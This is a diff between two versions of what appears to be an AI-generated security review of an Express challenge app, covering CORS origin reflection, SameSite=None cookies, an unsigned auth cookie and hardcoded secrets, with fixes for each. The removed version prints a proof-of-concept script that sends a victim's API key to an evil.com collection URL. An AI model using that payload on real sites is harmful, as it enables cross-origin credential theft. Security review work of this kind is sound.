@@ -1,115 +1,23 @@
-I now have everything needed for a full three-pass review. Let me conduct the analysis.
+I have all the information needed. Performing the three-pass analysis now.
 
 ---
 
-# Security Review — `challenge-21`
+# AppSec Review — `challenge-21`
 
-**Scope:** `main.js`, `package.json`, `get-api-key.req`  
-**Stack:** Node.js + Express 4.21.1 + cookie-parser 1.4.7
-
----
-
-## Pass 1 — Attack Surface Map
-
-**Entry points:**
-- `GET /mock-login` — sets `auth` cookie; no credential check
-- `GET /api-key` — reads `auth` cookie value as a username key, returns API key
-
-**Trust boundaries:**
-- `req.cookies.auth` — fully attacker-controlled string (unsigned, unverified)
-- `req.get('Origin')` — fully attacker-controlled HTTP header
-- `users` object — static in-process data (treated as sensitive)
-
-**Sensitive operations:**
-- CORS middleware reflects `Origin` header with `Access-Control-Allow-Credentials: true`
-- Cookie value used directly as object lookup key → API key returned
-- Cookie has `SameSite: None` enabling cross-site cookie delivery
+**Scope:** `main.js`, `package.json`, `get-api-key.req`
+**Language/Framework:** Node.js / Express 4.21.1
 
 ---
 
-## Findings
+## Finding 1: CORS — Credentialed Origin Reflection
 
----
-
-## Finding 1: Unsigned Authentication Cookie — Direct Auth Bypass
-
-**File:** `main.js`  
-**Lines:** 26–28, 31–38  
-**CWE:** CWE-565 — Reliance on Cookies Without Validation and Integrity Check  
-**OWASP Category:** A07:2021 – Identification and Authentication Failures  
-**Priority:** P1  
-**Severity:** CRITICAL  
-**Confidence:** HIGH
-
-### Vulnerable Code
-```javascript
-app.get('/mock-login', (req, res) => {
-    res.cookie('auth', users.admin.username, { httpOnly: true, secure: true, sameSite: "none"});
-    return res.status(200).json({ message: 'Login successful!' });;
-});
-
-app.get('/api-key', (req, res) => {
-    const username = req.cookies.auth;
-
-    if (username && users[username]) {
-        return res.status(200).json({ data: users[username].apiKey });
-    }
-```
-
-### Description
-The `auth` cookie contains only the raw username string `"admin"` with no cryptographic signature or integrity protection. The `httpOnly` and `secure` flags only prevent JavaScript theft and non-HTTPS transmission respectively — they impose no verification burden on the server. Any client can send `Cookie: auth=admin` and the server will accept it as authenticated, returning the API key. The `get-api-key.req` test file itself demonstrates this: it manually sets `Cookie: auth=admin` with no prior login. This is authentication by plaintext assertion.
-
-### Prioritization
-Highest priority. This is a zero-precondition authentication bypass: no victim interaction, no network position, no race condition required. An attacker simply sets the cookie value to any known username.
-
-### Exploitability Notes
-- **Exploit Preconditions:** Knowledge of a valid username (e.g., `admin` — visible in source). Ability to set arbitrary cookie headers (any HTTP client or browser DevTools).
-- **Uncertainty Boundary:** None. The exploit works as stated against any client making a direct request.
-
-### Remediation
-Use Express's built-in signed-cookie support. `cookie-parser` already supports this — the server signs each cookie value with an HMAC and rejects unsigned or tampered values at the middleware layer.
-
-```javascript
-// Initialize with a secret
-app.use(cookieParser(process.env.COOKIE_SECRET)); // e.g. 32+ bytes random
-
-// On login: issue a signed cookie
-app.get('/mock-login', (req, res) => {
-    res.cookie('auth', users.admin.username, {
-        httpOnly: true,
-        secure: true,
-        sameSite: 'strict',  // see Finding 2
-        signed: true         // HMAC-protected
-    });
-    return res.status(200).json({ message: 'Login successful!' });
-});
-
-// On protected route: verify the signed cookie
-app.get('/api-key', (req, res) => {
-    const username = req.signedCookies.auth; // false if tampered
-    if (username && Object.hasOwn(users, username)) {
-        return res.status(200).json({ data: users[username].apiKey });
-    }
-    return res.status(403).json({ message: 'Unauthorized access!' });
-});
-```
-
-**Counterfactual invalidation:** If the cookie were issued with `signed: true` and the endpoint read `req.signedCookies.auth`, a tampered or forged cookie would return `false`, making this finding invalid.
-
-### References
-- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
-- [CWE-565](https://cwe.mitre.org/data/definitions/565.html)
-
----
-
-## Finding 2: CORS Origin Reflection with Credentials Enabled
-
-**File:** `main.js`  
-**Lines:** 16–23  
-**CWE:** CWE-942 — Permissive Cross-domain Policy with Untrusted Domains  
-**OWASP Category:** A05:2021 – Security Misconfiguration  
-**Priority:** P1  
-**Severity:** HIGH  
+**Finding ID:** `APPSEC-f7c3d29e1a`
+**File:** `main.js`
+**Lines:** 16–22
+**CWE:** CWE-942 — Permissive Cross-domain Policy with Untrusted Domains
+**OWASP Category:** A05:2021 – Security Misconfiguration
+**Priority:** P1
+**Severity:** CRITICAL
 **Confidence:** HIGH
 
 ### Vulnerable Code
@@ -125,42 +33,21 @@ app.use((req, res, next) => {
 ```
 
 ### Description
-The CORS middleware reflects the attacker-controlled `Origin` request header verbatim into `Access-Control-Allow-Origin` while simultaneously setting `Access-Control-Allow-Credentials: true`. This is the canonical high-priority CORS misconfiguration: any origin is effectively trusted, and the browser will include cookies on cross-origin requests and expose the response body to the requesting JavaScript. Combined with the `SameSite: None` cookie attribute (line 27), which explicitly allows the `auth` cookie to be sent cross-site, an attacker-controlled page can use `fetch(..., {credentials: 'include'})` to trigger an authenticated request from any victim's browser and read back the API key.
+The CORS middleware unconditionally reflects the attacker-controlled `Origin` request header into `Access-Control-Allow-Origin` while simultaneously setting `Access-Control-Allow-Credentials: true`. This is the textbook credentialed origin reflection anti-pattern: because the browser sees an exact-match origin with credentials allowed, it permits any cross-origin page to make authenticated requests and read the full response. Combined with Finding 2 (`sameSite: "none"` on the auth cookie), an attacker page at `https://evil.com` can issue `fetch('http://localhost:3000/api-key', {credentials: 'include'})`, receive the victim's `auth` cookie automatically, and read the JSON response containing the API key — with no user interaction beyond visiting the attacker's site. The `get-api-key.req` artifact directly demonstrates this attack vector (`Origin: https://test.com` + `Cookie: auth=admin`).
 
 ### Prioritization
-Second-highest priority (slightly below Finding 1 which requires no victim interaction). This attack requires a victim to visit an attacker-controlled origin while holding a valid session, but the impact is full API key exfiltration.
+P1 — highest priority. This is directly and trivially exploitable from any origin with no preconditions beyond the victim having an active session. Findings 3 and 4 are secondary.
 
 ### Exploitability Notes
-- **Exploit Preconditions:** Victim must be authenticated (holds valid `auth` cookie). Victim must visit or be redirected to the attacker's page. Attacker controls any HTTPS origin (or localhost for same-device attacks).
-- **Uncertainty Boundary:** Exploit assumes the browser respects CORS semantics (all modern browsers do). No server-side runtime variables affect this.
-
-**Concrete attacker-controlled input:**
-```
-Origin: https://evil.com
-```
-Response:
-```
-Access-Control-Allow-Origin: https://evil.com
-Access-Control-Allow-Credentials: true
-```
-
-**Attacker page payload:**
-```html
-<!-- hosted on https://evil.com -->
-<script>
-fetch('https://target:3000/api-key', { credentials: 'include' })
-  .then(r => r.json())
-  .then(d => fetch('https://evil.com/collect?k=' + d.data));
-</script>
-```
+- **Exploit Preconditions:** Victim must have a valid `auth` cookie (obtained via `/mock-login` or a real login flow). Attacker hosts a page the victim visits.
+- **Uncertainty Boundary:** If an upstream reverse proxy strips or overwrites the `Origin` header before Express sees it, exploitability would be reduced — but no such proxy is in scope.
 
 ### Remediation
-Replace the reflective middleware with a strict allowlist. Change `SameSite` to `strict` or `lax` to prevent the cookie from traveling cross-site (coordinate with Finding 1 fix).
+Replace the wildcard reflection with an explicit allowlist. `Access-Control-Allow-Credentials: true` must never be paired with a dynamically reflected origin.
 
 ```javascript
 const ALLOWED_ORIGINS = new Set([
-    'https://www.yourdomain.com',
-    'https://app.yourdomain.com'
+  'https://your-frontend.example.com',
 ]);
 
 app.use((req, res, next) => {
@@ -174,72 +61,123 @@ app.use((req, res, next) => {
 });
 ```
 
-**Counterfactual invalidation:** If the middleware checked `ALLOWED_ORIGINS.has(origin)` before reflecting, arbitrary origins would receive no CORS grant and the cross-origin read would be blocked by the browser.
+**Counterfactual invalidation:** If `ALLOWED_ORIGINS.has(origin)` gates the reflection, an attacker-controlled origin never appears in the response header and the browser blocks the cross-origin read.
 
 ### References
-- [OWASP CORS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/CORS_Cheat_Sheet.html)
-- [PortSwigger CORS Vulnerabilities](https://portswigger.net/web-security/cors)
-- [CWE-942](https://cwe.mitre.org/data/definitions/942.html)
+- https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny
+- https://cwe.mitre.org/data/definitions/942.html
 
 ---
 
-## Finding 3: Unvalidated Object Property Key from Cookie (Prototype Chain Bypass)
+## Finding 2: Authentication Cookie Set With `SameSite=None`
 
-**File:** `main.js`  
-**Lines:** 32–37  
-**CWE:** CWE-915 — Improperly Controlled Modification of Dynamically-Determined Object Attributes  
-**OWASP Category:** A01:2021 – Broken Access Control  
-**Priority:** P2  
-**Severity:** MEDIUM  
+**Finding ID:** `APPSEC-b8e2a47c1d`
+**File:** `main.js`
+**Lines:** 27
+**CWE:** CWE-1275 — Sensitive Cookie with Improper SameSite Attribute
+**OWASP Category:** A05:2021 – Security Misconfiguration
+**Priority:** P1
+**Severity:** HIGH
 **Confidence:** HIGH
 
 ### Vulnerable Code
 ```javascript
-const username = req.cookies.auth;
-
-if (username && users[username]) {
-    return res.status(200).json({ data: users[username].apiKey });
-}
+res.cookie('auth', users.admin.username, { httpOnly: true, secure: true, sameSite: "none"});
 ```
 
 ### Description
-The cookie value is used directly as a property key on the `users` object without verifying it is an own property. In JavaScript, `users['__proto__']` evaluates to `Object.prototype` (truthy), causing the condition to pass for an attacker-supplied value of `__proto__`. The code then reads `Object.prototype.apiKey` which is `undefined`, so no secret is leaked — but the endpoint returns HTTP 200 with `{}` instead of 403 Unauthorized. This bypass also applies to `constructor` and `toString`. If any future code pollutes `Object.prototype.apiKey` (or a dependency does), the check would expose that value. The correct guard is `Object.hasOwn(users, username)`.
+The authentication cookie is issued with `sameSite: "none"`, which explicitly instructs the browser to attach this cookie on all cross-site requests, including those initiated by third-party pages. This directly enables the CORS-based theft in Finding 1: without `sameSite: "none"`, the browser would withhold the `auth` cookie on the cross-origin `fetch` from `evil.com`, stopping the attack even if the CORS headers were misconfigured. With both issues present together, the exploit chain is complete with zero user interaction beyond visiting a malicious page. The `secure: true` flag is correct and necessary, but it does not mitigate the cross-site exposure.
 
 ### Prioritization
-P2 behind Findings 1 and 2. Direct impact is limited to 200-vs-403 response code confusion in the current code, but the pattern creates fragile security logic.
+P1 — co-primary with Finding 1. These two issues form a complete attack chain together. Remediating either one independently breaks the chain; remediating both is required for defense-in-depth.
 
 ### Exploitability Notes
-- **Exploit Preconditions:** Attacker can set `Cookie: auth=__proto__` (easy given unsigned cookie from Finding 1). Server must be running Node.js (V8's `__proto__` accessor).
-- **Uncertainty Boundary:** No secret is exposed in the current code unless `Object.prototype` is polluted by another dependency.
+- **Exploit Preconditions:** Victim must have an `auth` cookie. The `/mock-login` endpoint means any user can obtain one with no credentials.
+- **Uncertainty Boundary:** Some browsers have begun partitioning third-party cookies by default; behavior may vary by browser version and user settings.
 
 ### Remediation
+Change `sameSite` from `"none"` to `"strict"` (or `"lax"` if cross-site GET navigation must carry the cookie). `sameSite: "none"` is only appropriate for cookies that must intentionally work in third-party/embedded contexts (e.g., payment iframes).
+
 ```javascript
-const username = req.cookies.auth;
-
-if (username && Object.hasOwn(users, username)) {
-    return res.status(200).json({ data: users[username].apiKey });
-}
-
-return res.status(403).json({ message: 'Unauthorized access!' });
+res.cookie('auth', users.admin.username, {
+    httpOnly: true,
+    secure: true,
+    sameSite: "strict"   // was "none" — prevents cross-site request cookie attachment
+});
 ```
 
-`Object.hasOwn` (Node ≥ 16.9) or `Object.prototype.hasOwnProperty.call(users, username)` ensures only explicitly defined user entries are accepted.
+**Counterfactual invalidation:** With `sameSite: "strict"`, the browser withholds the `auth` cookie on the cross-origin fetch from `evil.com`, preventing the CORS-based read of the API key even if the CORS headers remain misconfigured.
 
 ### References
-- [CWE-915](https://cwe.mitre.org/data/definitions/915.html)
-- [MDN Object.hasOwn()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/hasOwn)
+- https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#samesite_attribute
+- https://cwe.mitre.org/data/definitions/1275.html
 
 ---
 
-## Finding 4: Sensitive Data Hardcoded in Source
+## Finding 3: Unauthenticated `/mock-login` Grants Admin Session to Any Caller
 
-**File:** `main.js`  
-**Lines:** 9–14  
-**CWE:** CWE-798 — Use of Hard-coded Credentials  
-**OWASP Category:** A02:2021 – Cryptographic Failures  
-**Priority:** P2  
-**Severity:** LOW  
-**Confidence:** LOW
+**Finding ID:** `APPSEC-4d9b2c7f3e`
+**File:** `main.js`
+**Lines:** 26–29
+**CWE:** CWE-306 — Missing Authentication for Critical Function
+**OWASP Category:** A07:2021 – Identification and Authentication Failures
+**Priority:** P2
+**Severity:** HIGH
+**Confidence:** HIGH
+
+### Vulnerable Code
+```javascript
+app.get('/mock-login', (req, res) => {
+    res.cookie('auth', users.admin.username, { httpOnly: true, secure: true, sameSite: "none"});
+    return res.status(200).json({ message: 'Login successful!' });;
+});
+```
+
+### Description
+`/mock-login` unconditionally issues a valid `auth=admin` session cookie to any caller, no credentials required. The code comment acknowledges this as a placeholder ("imagine this is a fully grown login"), but as deployed the endpoint constitutes a complete authentication bypass: any unauthenticated actor can obtain an admin session in one unauthenticated GET request and then retrieve the API key from `/api-key`. This also provides the prerequisite session needed to make Finding 1 exploitable from any origin.
+
+### Prioritization
+P2. The CORS and SameSite issues (Findings 1–2) are the primary attack path for external attackers. This finding additionally allows direct, unauthenticated API key retrieval by any party who can reach the server.
+
+### Exploitability Notes
+- **Exploit Preconditions:** Network access to `GET /mock-login`. No credentials, tokens, or prior session required.
+- **Uncertainty Boundary:** Code is explicitly marked as a challenge placeholder; in a production replacement, real credential verification would gate this endpoint.
+
+### Remediation
+Replace the automatic cookie issuance with credential validation before granting a session. The pattern below shows the minimum-viable shape; substitute a real user store and a password-hash comparison.
+
+```javascript
+app.post('/login', async (req, res) => {
+    const { username, password } = req.body;
+    const user = users[username];
+    if (!user || !await bcrypt.compare(password, user.passwordHash)) {
+        return res.status(401).json({ message: 'Invalid credentials' });
+    }
+    res.cookie('auth', user.username, {
+        httpOnly: true,
+        secure: true,
+        sameSite: 'strict'
+    });
+    return res.status(200).json({ message: 'Login successful!' });
+});
+```
+
+### References
+- https://cwe.mitre.org/data/definitions/306.html
+- https://owasp.org/www-project-top-ten/2021/A07_2021-Identification_and_Authentication_Failures
+
+---
+
+## Finding 4: Hardcoded API Key in Source
+
+**Finding ID:** `APPSEC-1a5c9e3f7b`
+**File:** `main.js`
+**Lines:** 9–14
+**CWE:** CWE-798 — Use of Hard-coded Credentials
+**OWASP Category:** A02:2021 – Cryptographic Failures
+**Priority:** P2
+**Severity:** HIGH
+**Confidence:** HIGH
 
 ### Vulnerable Code
 ```javascript
@@ -252,45 +190,44 @@ const users = {
 ```
 
 ### Description
-An API key is embedded directly in source code. The code comment acknowledges this is a challenge placeholder (`"For the sake of the challenge..."`), lowering confidence that a real secret is present. However, the code structure demonstrates the dangerous pattern: if a real API key replaced the placeholder, every developer, CI runner, and repository viewer would have access to it. Real secrets must never be hardcoded; they must be loaded at runtime from environment variables or a secrets manager and must never appear in version control.
+The API key (and the entire user store) is hardcoded directly in the application source. Any developer with read access to the repository, any CI log that prints this file, or any accidental exposure of source code immediately reveals the credential. Rotation requires a code change and a redeployment rather than a secrets-store update. The code comment acknowledges intent to move this to a database, but the current form constitutes a static secret embedded in version-controlled code.
 
 ### Prioritization
-P2. Low confidence that a real secret is present (placeholder string). In a production codebase this pattern would be HIGH severity.
+P2. The CORS and SameSite findings allow runtime theft of the API key; this finding allows static theft from source. Both paths must be closed.
 
 ### Exploitability Notes
-- **Exploit Preconditions:** Access to the source code repository.
-- **Uncertainty Boundary:** The placeholder value `'<some-secret-API-key>'` is not itself a usable credential.
+- **Exploit Preconditions:** Read access to the source file (repo, CI artifact, deployed bundle).
+- **Uncertainty Boundary:** The placeholder value `<some-secret-API-key>` suggests the real key has not yet been committed; this finding applies when the real value is substituted.
 
 ### Remediation
-```javascript
-// Load from environment at startup — never commit actual values
-const users = {
-    admin: {
-        username: 'admin',
-        apiKey: process.env.ADMIN_API_KEY  // set via secrets manager / .env (gitignored)
-    }
-};
+Load secrets from environment variables (or a secrets manager) at startup; never commit them to source.
 
-// Fail fast if required secrets are absent
-if (!users.admin.apiKey) {
-    throw new Error('ADMIN_API_KEY environment variable is required');
+```javascript
+// Load from environment at startup — never hardcode
+const API_KEY = process.env.ADMIN_API_KEY;
+if (!API_KEY) throw new Error('ADMIN_API_KEY environment variable is required');
+
+// Resolve users from DB at request time; for this shape:
+async function getUserByUsername(username) {
+    return db.query('SELECT username, api_key FROM users WHERE username = $1', [username]);
 }
 ```
 
 ### References
-- [CWE-798](https://cwe.mitre.org/data/definitions/798.html)
-- [OWASP Secrets Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html)
+- https://cwe.mitre.org/data/definitions/798.html
+- https://owasp.org/www-project-top-ten/2021/A02_2021-Cryptographic_Failures
 
 ---
 
-## Finding 5: Missing HTTP Security Headers
+## Finding 5: Missing HTTP Security Headers (No `helmet`)
 
-**File:** `main.js`  
-**Lines:** 1–6  
-**CWE:** CWE-16 — Configuration  
-**OWASP Category:** A05:2021 – Security Misconfiguration  
-**Priority:** P3  
-**Severity:** INFO  
+**Finding ID:** `APPSEC-9e2d5a1c4b`
+**File:** `main.js`
+**Lines:** 1–6
+**CWE:** CWE-693 — Protection Mechanism Failure
+**OWASP Category:** A05:2021 – Security Misconfiguration
+**Priority:** P3
+**Severity:** LOW
 **Confidence:** HIGH
 
 ### Vulnerable Code
@@ -298,30 +235,36 @@ if (!users.admin.apiKey) {
 const express = require('express');
 const cookieParser = require('cookie-parser');
 const app = express();
+// No helmet() or equivalent security header middleware
+app.use(cookieParser());
 ```
 
 ### Description
-The application uses no security header middleware. Express does not set `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`, or `Content-Security-Policy` by default. While these are defense-in-depth controls with lower direct exploitability, their absence means the app is missing the browser-side mitigations that limit clickjacking, MIME-sniffing, and downgrade attacks.
+The application sets no defensive HTTP response headers. Missing headers include `X-Content-Type-Options: nosniff` (MIME sniffing), `X-Frame-Options` / `Content-Security-Policy frame-ancestors` (clickjacking), `Strict-Transport-Security` (HTTPS downgrade), and a `Content-Security-Policy` (XSS restriction). While none of these directly enable the primary attack chains above, their absence reduces defense-in-depth and is trivially fixed.
 
 ### Prioritization
-P3. Low standalone exploitability — Findings 1 and 2 are the dominant risks.
+P3. Address after Findings 1–4. No standalone exploit path; these are defense-in-depth controls.
 
 ### Exploitability Notes
-- **Exploit Preconditions:** Depends on specific header; clickjacking requires a framed page.
-- **Uncertainty Boundary:** Impact of missing HSTS depends on whether TLS termination happens upstream.
+- **Exploit Preconditions:** Requires other vulnerabilities (e.g., XSS entry point) to be meaningfully exploited.
+- **Uncertainty Boundary:** Impact depends on the full application context; headers matter more at higher complexity.
 
 ### Remediation
+Add `helmet` as the first middleware:
+
 ```bash
 npm install helmet
 ```
+
 ```javascript
 const helmet = require('helmet');
-app.use(helmet()); // sets X-Frame-Options, X-Content-Type-Options, HSTS, CSP, and more
+app.use(helmet()); // sets X-Content-Type-Options, X-Frame-Options, HSTS, and more
+app.use(cookieParser());
 ```
 
 ### References
-- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
-- [Helmet.js](https://helmetjs.github.io/)
+- https://helmetjs.github.io/
+- https://owasp.org/www-project-secure-headers/
 
 ---
 
@@ -335,18 +278,14 @@ app.use(helmet()); // sets X-Frame-Options, X-Content-Type-Options, HSTS, CSP, a
 | Files Analyzed  | 3     |
 | Total Findings  | 5     |
 | Critical        | 1     |
-| High            | 1     |
-| Medium          | 1     |
+| High            | 3     |
+| Medium          | 0     |
 | Low             | 1     |
-| Info            | 1     |
-
-### Key Risks
-The application has a zero-precondition authentication bypass (unsigned cookie allows any attacker
-to impersonate any user directly) compounded by a CORS misconfiguration that enables cross-origin
-API key theft from victim sessions. These two findings interact with the SameSite=None cookie
-attribute to create a fully weaponizable attack chain requiring no server-side compromise.
+| Info            | 0     |
 ```
 
-### Prioritization Notes
+### Key Risks
+Findings 1 and 2 form a complete, zero-interaction attack chain: the credentialed CORS origin reflection combined with `sameSite: "none"` allows any attacker-controlled page to silently steal the authenticated victim's API key via a cross-origin `fetch`. Finding 3 means any unauthenticated caller can also directly obtain an admin session — and therefore the API key — without needing the CORS exploit at all. **Remediate Findings 1 and 2 together first; neither alone fully closes the cross-origin theft path.**
 
-Finding 1 (unsigned cookie) is ranked above Finding 2 (CORS) because it requires no victim interaction — an attacker can directly forge `Cookie: auth=admin` to retrieve the API key without needing a victim's browser. Finding 2 is ranked P1 nonetheless because it enables a browser-based theft that bypasses network controls. Both must be fixed; remediation of Finding 1 alone does not eliminate Finding 2.
+### Prioritization Notes
+Findings 1–2 are ordered co-first because they are co-dependent exploit primitives: each alone is insufficient, but together they achieve unauthenticated cross-origin API key theft. Finding 3 is P2 because it provides a second, independent path to the same impact. Findings 4–5 are background hardening priorities.
